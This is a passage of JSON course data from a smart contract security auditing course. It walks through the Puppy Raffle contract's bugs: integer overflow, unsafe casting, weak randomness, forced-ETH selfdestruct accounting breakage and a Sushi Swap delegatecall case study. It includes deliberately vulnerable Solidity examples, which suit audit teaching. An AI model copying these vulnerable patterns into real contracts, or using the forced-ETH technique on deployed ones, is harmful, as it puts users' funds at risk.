          "markdownContent": "---\ntitle: Integer Overflow - Mitigation\n---\n\n_Follow along with this video:_\n\n---\n\n### Mitigation\n\nInteger over/underflow is actually fairly straightforward to mitigate against.\n\n```js\nfunction selectWinner() external {\n    require(block.timestamp >= raffleStartTime + raffleDuration, \"PuppyRaffle: Raffle not over\");\n    require(players.length >= 4, \"PuppyRaffle: Need at least 4 players\");\n    uint256 winnerIndex =\n        uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;\n    address winner = players[winnerIndex];\n    uint256 totalAmountCollected = players.length * entranceFee;\n    uint256 prizePool = (totalAmountCollected * 80) / 100;\n    uint256 fee = (totalAmountCollected * 20) / 100;\n    // @Audit: Newer version of Solidity, Bigger Uints\n    totalFees = totalFees + uint64(fee);\n```\n\nIn our `Puppy Raffle` protocol we would likely suggest a newer Solidity version. The use of a `uint64` is also just silly.\n\nFoundry allows us to verify the max sizes of the numbers really conveniently through a `chisel` command. Typing `chisel` will start `chisel`, the command `type(uint64).max` will give an output like this:\n\n```bash\nWelcome to Chisel! Type `!help` to show available commands.\nâžœ type(uint64).max\nType: uint\nâ”œ Hex: 0x000000000000000000000000000000000000000000000000ffffffffffffffff\nâ”” Decimal: 18446744073709551615\nâžœ\n```\n\n_18 ETH due to having 18 decimal places_\n\nIf `Puppy Raffle` receives more than 18 ETH in fees, we're going to see overflow issues!\n\nExperiment with `chisel` and try different `uint/int` types to get a sense for how big/small some of these common numbers are!\n",
          "updates": []
        },
        {
          "lessonId": "34856ce8-f62b-469b-bc59-c053b97d3e69",
          "number": 31,
          "title": "Exploit: Unsafe casting",
          "slug": "unsafe-casting",
          "folderName": "31-unsafe-casting",
          "description": "",
          "duration": 4,
          "videoUrl": "YBvahGC3O2RcQLtPsOCuU6901UQsygpBjZ8Ew3AIIrg4",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/31-unsafe-casting/+page.md",
          "markdownContent": "---\ntitle: Unsafe Casting\n---\n\n_Follow along with this video:_\n\n---\n\n### Unsafe Casting Breakdown\n\nThere's another issue with the line `totalFees = totalFees + uint64(fee)` that's similar to integer overflow, but a little different.\n\nUsing `chisel` again, we can see that a max `uint64` is 18446744073709551615.\n\n```bash\nWelcome to Chisel! Type `!help` to show available commands.\nâžœ type(uint64).max\nType: uint\nâ”œ Hex: 0x000000000000000000000000000000000000000000000000ffffffffffffffff\nâ”” Decimal: 18446744073709551615\nâžœ\n```\n\nWe've also learnt that adding any to this number is going to wrap around to 0 again, but what happens if we try to cast a larger number into this smaller container?\n\n<img src=\"/security-section-4/31-unsafe-casting/unsafe-casting1.png\" style=\"width: 75%; height: auto;\">\n\nWe can see above that when `20e18` is cast as a `uint64` the returned value is actually the difference between `type(uint64).max` and `20e18`.\n\nOur value has wrapped on us again!\n\n```js\n// twentyEth         = 20000000000000000000\n// type(uint64).max  = 18446744073709551615\n// uint64(twenthEth) =  1553255926290448384\n```\n\nThis is absolutely something we're caalling out in our audit report. Puppy Raffle is at risk of losing so many fees!\n",
          "updates": []
        },
        {
          "lessonId": "0f511af4-595c-4b3e-bd92-dabb16222f66",
          "number": 32,
          "title": "Recon II",
          "slug": "recon-continued-2",
          "folderName": "32-recon-continued-2",
          "description": "",
          "duration": 11,
          "videoUrl": "ihCoLDxSFounXaGL3sGS5MJtjUS00e9MIj5B02RPwJ59w",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/32-recon-continued-2/+page.md",
          "markdownContent": "---\ntitle: Recon Continued 2\n---\n\n_Follow along with this video:_\n\n---\n\n### Continuing Reconnaissance\n\nWe've already found **two** big bugs in this selectWinner function! This is great, let's continue down the code and see what else we uncover.\n\nThe next line in our code is `uint256 tokenId = totalSupply()`. It may be worth confirming where `totalSupply()` is coming from and making some in-line notes of questions to answer later.\n\n```js\n...\n    //\n    uint256 tokenId = totalSupply();\n\n    // We use a different RNG calculate from the winnerIndex to determine rarity\n    uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;\n    if (rarity <= COMMON_RARITY) {\n        tokenIdToRarity[tokenId] = COMMON_RARITY;\n    } else if (rarity <= COMMON_RARITY + RARE_RARITY) {\n        tokenIdToRarity[tokenId] = RARE_RARITY;\n    } else {\n        tokenIdToRarity[tokenId] = LEGENDARY_RARITY;\n    }\n\n    delete players;\n    raffleStartTime = block.timestamp;\n    previousWinner = winner;\n    (bool success,) = winner.call{value: prizePool}(\"\");\n    require(success, \"PuppyRaffle: Failed to send prize pool to winner\");\n    _safeMint(winner, tokenId);\n}\n```\n\nWe can see that `totalSupply()` is coming from our `ERC721 inheritance` and is returning `_tokenOwners.length`\n\n```js\nfunction totalSupply() public view virtual override returns (uint256) {\n    // _tokenOwners are indexed by tokenIds, so .length() returns the number of tokenIds\n    return _tokenOwners.length();\n}\n```\n\nERC721 is a very common token standard and tokenSupply is a well known function within it. You should absolutely familiarize yourself with these concepts. Ultimately things look good here, but we may want to make note:\n\n```js\n// @Audit: Where is tokenId/tokenSupply being incremented?\nuint256 tokenId = totalSupply();\n```\n\nContinuing with our `selectWinner` function we next see that a token rarity is being determined. `Weak Randomness` is seen again! Something to note is - any time I see constants being used, I like to verify what they are. In this case the constants in this code are representing percentage changes of obtaining a giving rarity.\n\n```js\n// @Audit: Weak Randomness\nuint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;\n//\nif (rarity <= COMMON_RARITY) {\n    tokenIdToRarity[tokenId] = COMMON_RARITY;\n} else if (rarity <= COMMON_RARITY + RARE_RARITY) {\n    tokenIdToRarity[tokenId] = RARE_RARITY;\n} else {\n    tokenIdToRarity[tokenId] = LEGENDARY_RARITY;\n}\n```\n\nFollowing this, our function performs a number of state changes. Let's make note of what each of these is actually doing.\n\n```js\ndelete players; // resetting the players array\nraffleStartTime = block.timestamp; // resetting the raffle start time\npreviousWinner = winner; // vanity, doesn't impact much\n```\n\nFinally we see calls to send the `prizePool` and mint the NFT to the winner.\n\n```js\n(bool success,) = winner.call{value: prizePool}(\"\");\nrequire(success, \"PuppyRaffle: Failed to send prize pool to winner\");\n_safeMint(winner, tokenId);\n```\n\nWe may even suspect that `re-entrancy` is a risk here, given the order of these lines. So let's verify!\n\nWhen a call is made externally, we should always ask ourselves what could happen in different scenarios.\n\n- _What if the recipient is a smart contract?_\n\n- _What if the contract doesn't have a receive/fallback function or forces a revert?_\n\n- _What if the recipient calls another function through receive/fallback?_\n\nThe more experience you gain performing security reviews, the better your intuition will be about which questions to ask and what to watch out for.\n\nIn this particular circumstance, we see that the `selectWinner` function includes require statements that would prevent re-entrancy at this point in this code as we've already reset these state variables. Whew!\n\n```js\nrequire(block.timestamp >=\n  raffleStartTime + raffleDuration, \"PuppyRaffle: Raffle not over\");\nrequire(players.length >= 4, \"PuppyRaffle: Need at least 4 players\");\n```\n\nHowever, if the winner had a broken `receive` function, `selectWinner` here would fail, it could actually be quite difficult to select a winner in that situation! We'll discuss impact and reporting of that a little later.\n\n```js\n// @Audit: Winner wouldn't be unable to receive rewards if fallback function was broken!\n(bool success,) = winner.call{value: prizePool}(\"\");\nrequire(success, \"PuppyRaffle: Failed to send prize pool to winner\");\n_safeMint(winner, tokenId);\n```\n\nAlright, we've completed a fairly thorough walkthrough of `selectWinner`, let's move onto the next function `withdrawFees`.\n\n> As always there may be more bugs in these repos than we go over, keep a look out!\n\n### Risks in withdrawFees\n\n```js\nfunction withdrawFees() external {\n    require(address(this).balance == uint256(totalFees), \"PuppyRaffle: There are currently players active!\");\n    uint256 feesToWithdraw = totalFees;\n    totalFees = 0;\n    (bool success,) = feeAddress.call{value: feesToWithdraw}(\"\");\n    require(success, \"PuppyRaffle: Failed to withdraw fees\");\n}\n```\n\nSo, let's break this function down to see what it's doing.\n\nFirst we see a require statement and already a couple questions come to mind _Hint: there are issues with this line_\n\n```js\n// @Audit: If there are players, fees can't be withdrawn, does this make withdrawl difficult?\nrequire(address(this).balance ==\n  uint256(totalFees), \"PuppyRaffle: There are currently players active!\");\n```\n\nThe next two lines are resetting our `totalFees`, seems fine.\n\n```js\nuint256 feesToWithdraw = totalFees;\ntotalFees = 0;\n```\n\nAnd finally we reach the external call which distributes the fees. It's worth noting that the address isn't the `owner`, fees are being sent to the `feeAddress` which our earlier `NatSpec` advises is controllable by the `owner`\n\n```js\n// @Audit: What if the feeAddress is a smart contract with a fallback/receive which reverts?\n(bool success,) = feeAddress.call{value: feesToWithdraw}(\"\");\nrequire(success, \"PuppyRaffle: Failed to withdraw fees\");\n```\n\n### Wrap Up\n\nWe've covered two more functions in `Puppy Raffle` and I think we're on the trail of a couple more bugs. In the next lesson, lets answer some of the questions we asked here and look at better practices to employ in protocols such as these.\n",
          "updates": []
        },
        {
          "lessonId": "019b4cd0-68fa-4a16-875c-f0918266a4fd",
          "number": 33,
          "title": "Exploit: Mishandling Of ETH",
          "slug": "exploit-mishandling-of-eth",
          "folderName": "33-exploit-mishandling-of-eth",
          "description": "",
          "duration": 3,
          "videoUrl": "YO2OKZVHcm7s02BSNdKdBsOuOGuJO9yFMpDUZzt00Z2024",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/33-exploit-mishandling-of-eth/+page.md",
          "markdownContent": "---\ntitle: Exploit - Mishandling of Eth\n---\n\n_Follow along with this video:_\n\n---\n\n### Eth Handling\n\nLet's pause a moment and focus on this line:\n\n```js\nrequire(address(this.balance) ==\n  uint256(totalFees), \"PuppyRaffle: there are currently players active!\");\n```\n\nEffectively, we're checking to assure that we don't withdraw funds that are current in a raffle.\n\nMaybe we're just being extra cautious. The idea behind using `address(this).balance` is that - beyond entering the raffle - there's no way this contract can receive funds, so this require should always be ok ... right?\n\n### No Receive, No Fallback, No Problem.\n\nPuppy Raffle's hope is that without a receive or fallback function, there should never be a way for this accounting to imbalance. Well, let's test it out.\n\n```js\nfunction testCantSendMoneyToRaffle() public {\n    address sendAddy = makeAddr(\"sender\");\n    vm.deal(sendAddy, 1 ether);\n    vm.expectRevert();\n    vm.prank(sendAddy);\n    (bool success, ) = payable(address(puppyRaffle)).call{value: 1 ether}(\"\");\n    require(success);\n}\n```\n\n<img src=\"/security-section-4/33-exploit-mishandling-eth/exploit-mishandling-eth1.png\" style=\"width: 75%; height: auto;\">\n\nRunning this test, we discover ... it passes! So we're done, right? Everything's secure?\n\nNot exactly.\n\n### Wrap Up\n\nIt may seem like everything is fine here and that the protocol's accounting is secure, but when it comes to the handling of Eth there can be many pitfalls and gotchas you need to look out for.\n\nIn the next lesson, we'll return to our [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) repo to investigate how Puppy Raffle may still be vulnerable in this broad category.\n",
          "updates": []
        },
        {
          "lessonId": "2f8971e7-ff01-4196-b83f-a56ba0eb81fc",
          "number": 34,
          "title": "Mishandling of ETH: Minimized",
          "slug": "mishandling-of-eth-minimized",
          "folderName": "34-mishandling-of-eth-minimized",
          "description": "",
          "duration": 6,
          "videoUrl": "D02cjLBEIt1fXDMpU9JzEPRexaBU3Jg3egzhJE02wPxnY",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/34-mishandling-of-eth-minimized/+page.md",
          "markdownContent": "---\ntitle: Mishandling of Eth - Minimized\n---\n\n_Follow along with this video:_\n\n---\n\n### Mishandling of Eth\n\nTo see this vulnerability in action we're going to again reference our [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) repo!\n\nThere are two situational examples available for `Mishandling of Eth` for this lesson we want [**Remix (Vulnerable to selfdestruct)**](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/mishandling-of-eth/SelfDestructMe.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js).\n\n> Remember: The codebase is available on the [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/mishandling-of-eth/SelfDestructMe.sol) repo as well, if you want to test things locally.\n\n### Remix Example\n\nWe've done this a few times, so we should be familiar with the process - go ahead and compile our `SelfDestructMe.sol` contract and deploy.\n\nYou'll likely be met with this message, `selfdestruct` is being heavily considered for deprecation, but for now this vulnerability still exists, so we can ignore this message for now.\n\n<img src=\"/security-section-4/34-mishandling-eth-minimized/mishandling-eth-minimized1.png\" style=\"width: 50%; height: auto;\">\n\n<details>\n<summary>SelfDestructMe.sol</summary>\n\n```js\ncontract SelfDestructMe {\n    uint256 public totalDeposits;\n    mapping(address => uint256) public deposits;\n\n    function deposit() external payable {\n        deposits[msg.sender] += msg.value;\n        totalDeposits += msg.value;\n    }\n\n    function withdraw() external {\n        /*\n            Apparently the only way to deposit ETH in the contract is via the `deposit` function.\n            If that were the case, this strict equality would always hold.\n            But anyone can deposit ETH via selfdestruct, or by setting this contract as the target\n            of a beacon chain withdrawal.\n            (see last paragraph of this section\n            https://eth2book.info/capella/part2/deposits-withdrawals/withdrawal-processing/#performing-withdrawals),\n            regardless of the contract not having a `receive` function.\n\n            If anybody deposits ETH that way, then the equality breaks and the contract is DoS'd.\n            To fix it, the code could be changed to >= instead of ==. Which means that the available\n            ETH balance should be _at least_ `totalDeposits`, which makes more sense.\n        */\n        assert(address(this).balance == totalDeposits); // bad\n\n        uint256 amount = deposits[msg.sender];\n        totalDeposits -= amount;\n        deposits[msg.sender] = 0;\n\n        payable(msg.sender).transfer(amount);\n    }\n}\n```\n\n</details>\n<br>\n\n`SelfDestructMe.sol` is a fairly straightforward contract at a glance, experiment with the basic functions of the contract as you wish.\n\nA user is able to deposit funds, which updates their balance as well as the `totalDeposits` variable. A user can also call `withdraw`, this function checks that the contract's balance is still equal to the `totalDeposits` and if so will updates balances and transfer funds.\n\nI've deposited 1 Ether to the contract, here.\n\n<img src=\"/security-section-4/34-mishandling-eth-minimized/mishandling-eth-minimized2.png\" style=\"width: 50%; height: auto;\">\n\nThe issue comes from this line:\n\n```js\nassert(address(this).balance == totalDeposits);\n```\n\nThe core of this vulnerability is the assumption that, without a `receive` or `fallback` function, the only way to send value to this contract is through the deposit function.\n\nThis is **_false_**.\n\nGo ahead and deploy the `AttackSelfDestructMe.sol` contract. The constructor requires an attack target, so be sure to copy the address for `SelfDestructMe.sol` and pass it to your deploy. Give the contract a balance during deployment as well.\n\n<img src=\"/security-section-4/34-mishandling-eth-minimized/mishandling-eth-minimized3.png\" style=\"width: 50%; height: auto;\">\n\nNow, when the attack function is called, `selfdestruct` will be triggered, and we expect to see our 5 Ether forced onto `SelfDestructMe.sol`.\n\nAnd, that's exactly what we see:\n\n<img src=\"/security-section-4/34-mishandling-eth-minimized/mishandling-eth-minimized4.png\" style=\"width: 50%; height: auto;\">\n\nLastly, try calling the `withdraw` function on `SelfDestructMe.sol`. It reverts! The contract's accounting has been broken and it's balance is now stuck!\n\n<img src=\"/security-section-4/34-mishandling-eth-minimized/mishandling-eth-minimized5.png\" style=\"width: 75%; height: auto;\">\n\n### Wrap Up\n\nWe've illustrated how relying on a contract's balance as a means of internal counting can be risky. There's really no way to be certain that arbitrary value isn't sent to a contract currenty.\n\nAs I'd mentioned previously, the concept of `Mishandling Eth` is a broad one. Our sc-exploits-minimized repo outlines another common scenario (push over pull) that I encourage you to look at, as we won't go over it here.\n\nUltimately, this is another finding for sure - let's make note of it.\n\n```js\n// @Audit: Mishandling Eth\nfunction withdraw() external {...}\n```\n",
          "updates": []
        },
        {
          "lessonId": "dd969938-351d-4952-af95-7ad356d5daaa",
          "number": 35,
          "title": "Case Study: Mishandling of ETH",
          "slug": "mishandling-of-eth-case-study",
          "folderName": "35-mishandling-of-eth-case-study",
          "description": "",
          "duration": 3,
          "videoUrl": "jEarsr8ctgtmxVcGQ72Wn8m4kbX9t2KWQF4G101Y02BAs",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/35-mishandling-of-eth-case-study/+page.md",
          "markdownContent": "---\ntitle: Mishandling of Eth - Case Study\n---\n\n_Follow along with this video:_\n\n---\n\n### Case Study: Sushi Swap\n\nIn this lesson we'll be briefly detailing how the `Mishandling of Eth` vulnerability lead to catastrophic consequences in the case of Sushi Swap.\n\nOne of the best things you can do to grow your skills as a security researcher is to read case studies and familiarize yourself with hacks. We've included, in the [**course repo**](https://github.com/Cyfrin/security-and-auditing-full-course-s23), a link to [**an article**](https://samczsun.com/two-rights-might-make-a-wrong/) illustrating the case study we'll be going over briefly.\n\nNow, the situation with Sushi Swap is different from what we've seen in other example, because again - `Mishandling of Eth` is a very broad category. Ultimately the issue was with this function:\n\n```js\nfunction batch(bytes[] calldata calls, bool revertOnFail) external payable returns (bool[] memory successes, bytes[] memory results) {\n    successes = new bool[](calls.length);\n    results = new bytes[](calls.length);\n    for (uint256 i = 0; i < calls.length; i++) {\n        (bool success, bytes memory result) = address(this).delegatecall(calls[i]);\n        require(success || !revertOnFail, _getRevertMsg(result));\n        successes[i] = success;\n        results[i] = result;\n    }\n}\n```\n\nIn the simplest terms, this function allows a user to compile multiple calls into a single transaction - sounds useful.\n\nThe oversight was in the use of `delegatecall`. When implementing delegatecall, msg.sender _and_ msg.value are persistant. This meant that a single value sent for one call in this function could be used for multiple calls!\n\n> **For example:** If I were to call a function which cost 1 Eth, to call it 100 times, it should cost 100 Eth. In the case of the `batch` function, a user would be able to call the function 100 times, for only 1 Eth!\n\n### Wrap Up\n\nI highly encourage you to read through the provided article and familiarize yourself with the Sushi Swap case. Vulnerabilities when handling Eth without care come in many shapes and sizes. We've gone through a few examples in the last few lessons that I hope instill an understanding of the care that should be taken when dealing with funds.\n\nIn the next lesson we'll continue our Puppy Raffle Recon!\n",
          "updates": []
        },
        {
          "lessonId": "85c941ab-17a5-4fb7-855f-ffcad2e2099d",
          "number": 36,
          "title": "Recon III",
          "slug": "recon-continued-3",
          "folderName": "36-recon-continued-3",
          "description": "",
          "duration": 7,
          "videoUrl": "ROxQ01UHkXgowLtHWWqW77DEAxoBV84qh91MgbWbNwH00",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/36-recon-continued-3/+page.md",
          "markdownContent": "---\ntitle: Recon Continued 3\n---\n\n_Follow along with this video:_\n\n---\n\n### Recon Continued\n\nWe're doing great so far and have uncovered lots - we definitely shouldn't stop now. The next function we'll approach is `changeFeeAddress`.\n\n### changeFeeAddress\n\n```js\n/// @notice only the owner of the contract can change the feeAddress\n/// @param newFeeAddress the new address to send fees to\nfunction changeFeeAddress(address newFeeAddress) external onlyOwner {\n    feeAddress = newFeeAddress;\n    emit FeeAddressChanged(newFeeAddress);\n}\n```\n\nTo begin with, let's look into the `changeFeeAddress` function. This function ensures that only the contract owner can make changes to the contract's `feeAddress`. The modifier `onlyOwner` that is used in this function is sourced from the OpenZeppelin library. We can (and should) inspect these functions to assure access control is working as we'd expect - it is.\n\n```javascript\n/**\n * @dev Throws if called by any account other than the owner.\n */\nmodifier onlyOwner() {\n    require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\n    _;\n}\n```\n\n`changeFeeAddress` then sets the `feeAddress` variable to the new address provided, and finally emits an event.\n\n> Whoops! - events should be emitted after state changes, we haven't seen many events til now, we may need to return to previous functions to verify!\n\nThings look fine with `changeFeeAddress`, what's next?\n\n## \\_isActivePlayer\n\n```javascript\n/// @notice this function will return true if the msg.sender is an active player\nfunction _isActivePlayer() internal view returns (bool) {\n    for (uint256 i = 0; i < players.length; i++) {\n        if (players[i] == msg.sender) {\n            return true;\n        }\n    }\n    return false;\n}\n```\n\nNow, we haven't seen this referenced anywhere before now, we may want to simply investigate when this function is being used.\n\n<img src=\"/security-section-4/36-recon-continued-3/recon-continued1.png\" style=\"width:75%; height:auto;\">\n\nIronically, it seems this function isn't being used anywhere in our protocol!\n\nWe would have to ask ourselves of course:\n\n```js\n// Impact:\n// Likelihood:\n```\n\nGiven that this is an `internal` function that is never called - the `impact` and `likelihood` are both realistically going to be `None`. With that said, this function is clearly a waste of gas.\n\nWhen we complete our write up, it's likely this will be an `Informational` or `Gas` severity.\n\n### \\_baseURI\n\n```js\n/// @notice this could be a constant variable\nfunction _baseURI() internal pure returns (string memory) {\n    return \"data:application/json;base64,\";\n}\n```\n\nThe next function down is `_baseURI`. This seems pretty straightforward. It looks like it provides a base for a tokenURI used for an SVG NFT implementation.\n\n> **Note:** If this is confusing to you, absolutely review the Foundry Full Course. NFTs are a huge part of DeFi and you _need_ to know this stuff intimately.\n\n### tokenURI\n\nSkimming through the `tokenURI` function, nothing initially sticks out as unusual. A few things we would want to check would be:\n\n- Assuring tokens have their rarity properly assigned.\n- Verifying mapping for `rarityToUri` and `rarityToName` and where they are set.\n- Double checking that the image URIs work for each rarity.\n\nThe function then ends in a whole bunch of encoding stuff. It's pretty heavy, so we're not going to go through it too deeply. There may be some redundancy here - I challenge you to sus it out - but for the most part this is good.\n\nDefinitely be thinking about _how can I break this view function?_\n\n### Wrap Up\n\nAt this point we've completed our first thorough review of the code base. We should definitely go back and reassess events, as well as dedicate some time considering state variables - but for the most part, we've completed an initial review!\n\nThis would be a great stage to go back through our notes and begin answering some of the questions we've been leaving ourselves.\n\n```js\n// Were custom reverts a thing in 0.7.6 of solidity?\n// - No!\n// What if the players.length == 0?\n// - still emits an event when creating the raffle?\n// etc...\n```\n\nWe likely have a tonne of questions at this point and it's good practice to now answer them. Going through our previous questions might even generate new ones - but we keep at the process until we have a solid understanding of how everything should and does work.\n\nUsually one pass of a code base isn't going to be enough. If there are unanswered questions, it's a good sign that you need to go deeper.\n\nIn the next lesson, we'll answer more of our questions, but I challenge you to go through some and try to find answers on your own before continuing!\n",
          "updates": []
        },
        {
          "lessonId": "7dddf0d6-a1fb-437a-89f6-fee77fd3a680",
          "number": 37,
          "title": "Answering our questions",
          "slug": "answering-our-questions",
          "folderName": "37-answering-our-questions",
          "description": "",
          "duration": 4,
          "videoUrl": "vrEL95cQXxkqmfLeKALFEHE19FFJ00avx101R01EPi1ltg",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/37-answering-our-questions/+page.md",
          "markdownContent": "---\ntitle: Answering Our Questions\n---\n\n_Follow along with this video:_\n\n---\n\n### Answering Our Questions\n\nThis lesson will be a little unconventional. I'm going to list some of the questions that were raised as we performed our recon on Puppy Raffle. I want you to challenge yourself to answer these questions, then compare to my answers below!\n\nQuestions:\n\n```js\n// Q1: What resets the players array?\n\n// Q2: What if enterRaffle is called with an empty array?\n\n// Q3: In the case of getActivePlayerIndex - what if the player is at Index 0?\n\n// Q4: Does the selectWinner function follow CEI?\n\n// Q5: Are raffleDuration and raffleStartTime being set correctly?\n\n// Q6: Why not use address(this).balance for the totalAmountCollected in the selectWinner function?\n\n// Q7: Is the 80% calculation for winners rewards correct?\n\n// Q8: Where do we increment the totalSupply/tokenId?\n\n// Q9: Can a user simply force the selectWinner function to revert if they don't like the results?\n\n// Q10: What happens if the winner is a contract with broken or missing receive/fallback functions?\n\n// Q11: What happens if the feeAddress is a contract with broken or missing receive/fallback functions?\n```\n\n---\n\n<details>\n<summary>Answers!</summary>\n\n```js\n// A1: The players array is reset in the selectWinner function.\n\n...\ndelete players;\nraffleStartTime = block.timestamp;\npreviousWinner = winner;\n(bool success,) = winner.call{value: prizePool}(\"\");\n...\n\n// A2: If an empty array is submitted, an event is still emitted by the function. This will likely go in our report.\n\n...\nfunction enterRaffle(address[] memory newPlayers) public payable {\n        require(msg.value == entranceFee * newPlayers.length, \"PuppyRaffle: Must send enough to enter raffle\");\n        ...\n        emit RaffleEnter(newPlayers);\n    }\n...\n\n// A3: A player at index zero, may believe they are not active in a raffle, as this function returns zero if a player is not found. This will also go in our report for sure.\n\n...\nfunction getActivePlayerIndex(address player) external view returns (uint256) {\n        for (uint256 i = 0; i < players.length; i++) {\n            if (players[i] == player) {\n                return i;\n            }\n        }\n        return 0;\n    }\n...\n\n// A4: No, the selectWinner function doesn't follow CEI and we would recommend to the protocol that it does. However, I happen to know this isn't an issue in this function, so we might flag this as informational.\n\n// A5: They are being set in the constructor and seem to be configured properly.\n\n...\nconstructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration) ERC721(\"Puppy Raffle\", \"PR\") {\n        entranceFee = _entranceFee;\n        feeAddress = _feeAddress;\n        raffleDuration = _raffleDuration;\n        raffleStartTime = block.timestamp;\n...\n\n// A6: This may be a design choice, but without clear rationale or a protocol to ask, we may flag this as informational for now.\n\n// A7: Yes, as per the documentation, 80% should be sent to the winner with 20% being retained in fees.\n\n// A8: This is handled by the OpenZeppelin ERC721.sol contract. Ultimately being set by this declaration when a winner is selected:\n\n...\nuint256 tokenId = totalSupply();\n...\n\n// A9: Yes! This will probably be an issue we'll want to add to our report.\n\n// A10: The winner wouldn't be able to receive their reward! This is definitely something we should report as a vulnerability.\n\n// A11: Sending funds to the feeAddress with the withdrawFees function will probably fail, but this is very low impact as the owner can simply change the feeAddress.\n```\n\n</details>\n",
          "updates": []
        },
        {
          "lessonId": "5953da27-94eb-44a6-a7ec-250b4637ea5f",
          "number": 38,
          "title": "Info and gas findings",
          "slug": "info-and-gas-findings",
          "folderName": "38-info-and-gas-findings",
          "description": "",
          "duration": 5,
          "videoUrl": "UmO71NH6ERcRe9tuR00ekLefSee2jX82Ld00D01GJQlAew",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/38-info-and-gas-findings/+page.md",
          "markdownContent": "---\ntitle: Info and Gas Findings\n---\n\n_Follow along with this video:_\n\n---\n\n### Info and Gas Findings\n\nWith all our questions answered, there still remain a few outstanding items we should consider.\n\nWe briefly ran Slither earlier in this section, but didn't look too closely at what its output was. We should definitely return to this. Additionally, as people who have gone through the Foundry course should recognize, this code base is not adhering to any design pattern best practices, and regularly chooses poor naming conventions.\n\nLet's review a few recommendations we could make to improve the code for this protocol.\n\n### Starting at the Top\n\nThe first thing we notice, at the very top of this repo are the naming conventions used for storage variables.\n\n<img src=\"../../../../static/security-section-4/38-info-and-gas/info-and-gas1.png\" style=\"width: 75%; height: auto;\">\n\nA convention I like to use for storage variables is the `s_variableName` convention! So this may be an informational finding we would want to submit.\n\nEven further up the contract there's a bigger concern however.\n\n```js\npragma solidity ^0.7.6\n```\n\nThis statement is what's known as a `floating pragma`. It essentially denotes that the contract is compatible with solidity versions up to and including `0.7.6`. This brings a number of concerns including vulnerabilities across multiple versions, so best practice is to use a single version of solidity.\n\nThis would be a great informational finding to include in our report.\n\n### Further Recommendations\n\nProgressing down the code base, the next thing I notice are these statements:\n\n```js\nuint256 prizePool = (totalAmountCollected * 80) / 100;\nuint256 fee = (totalAmountCollected * 20) / 100;\n```\n\nWhen raw numbers are used in a code body like this, we refer to them as `Magic Numbers`. They provide no context of what they're doing. Best practice would be to assign these to named constants.\n\n```js\nuint256 public constant PRIZE_POOL_PERCENTAGE = 80;\nuint256 public constant FEE_PERCENTAGE = 20;\nuint256 public constant POOL_PRECISION = 100;\n\nuint256 prizePool = (totalAmountCollected * PRIZE_POOL_PERCENTAGE) / POOL_PRECISION;\nuint256 fee = (totalAmountCollected * FEE_PERCENTAGE) / POOL_PRECISION;\n```\n\nThe last thing I'll point out is best verified through the project's `foundry.toml`. Here we can see the versions of the libraries being imported for the protocol.\n\nA good practice will be to investigate the specific versions being used for reported issues and security advisories.\n\nWe can navigate to the OpenZeppelin security section [**here**](https://github.com/OpenZeppelin/openzeppelin-contracts/security).\n\nThis section of the OpenZepplin repo is kept updated with known security vulnerabilities within various versions of the OpenZeppelin library.\n\nBy clicking on one of the advisories, we get a detailed breakdown including the affected versions.\n\n<img src=\"/security-section-4/38-info-and-gas/info-and-gas2.png\" style=\"width: 75%; height: auto;\">\n\n### Gas\n\nIn addition to informational findings in an audit, it can be optional to include gas recommendations for the protocol as well, though static analysis tools are getting really good at this and they're certainly becoming less common.\n\nOne example of such a suggestion in Puppy Raffle would be regarding `raffleDuration`. Currently this is a storage variable, but this never changes. Puppy Raffle could absolutely change this to be a `constant` or `immutable` variable to save substantial gas.\n",
          "updates": []
        },
        {
          "lessonId": "81cfb5f7-8d5b-44d1-abc6-860e8e2921c5",
          "number": 39,
          "title": "Pit stop",
          "slug": "pit-stop",
          "folderName": "39-pit-stop",
          "description": "",
          "duration": 2,
          "videoUrl": "6EUWIh9H6ExxyBWHW3D5302g2lCyp4bgm7OTXD00jT00lw",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/39-pit-stop/+page.md",
          "markdownContent": "---\ntitle: Pit Stop\n---\n\n_Follow along with this video:_\n\n---\n\n### Pitstop\n\nAt this point we're nearly done. We've two outstanding things to cover.\n\nThe first will be running through the `Slither` and `Aderyn` reports for Puppy Raffle and finally we'll check the code quality/tests for this repo.\n\nOnce we've completed those steps, I'm going to walk you through `Competitive Audits` on CodeHawks and how to submit a finding!\n\nThen, the very last thing we'll do in this section is write our Puppy Raffle report, with PoCs. We won't always be going through the entire reporting process together. It can be time intensive, but it's important for you to practice these skills on your own. This is your opportunity to test yourself, gain insights, and prepare for future competitive audits.\n\nYou can find the Puppy Raffle final report in markdown within the [**audit-data branch**](https://github.com/Cyfrin/4-puppy-raffle-audit/tree/audit-data/audit-data) of the repo, along with a PDF version. You will also find the output of our `Aderyn` and `Slither` reports there, in case you want to compare yours and ensure its correctness.\n\nThat's it! By the end you'll have another professional audit report to add to your security review portfolio.\n\nIn the next lesson, we start with Slither!\n",
          "updates": []
        },
        {
          "lessonId": "7193c982-2dae-435b-bf60-f6848ca9b475",
          "number": 40,
          "title": "Slither walkthrough",
          "slug": "slither-walkthrough",
          "folderName": "40-slither-walkthrough",
          "description": "",
          "duration": 13,
          "videoUrl": "8xCUno78bcmNZZHYAMBcOyZG2m5NkhN8qhfdpFhMkN4",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/40-slither-walkthrough/+page.md",
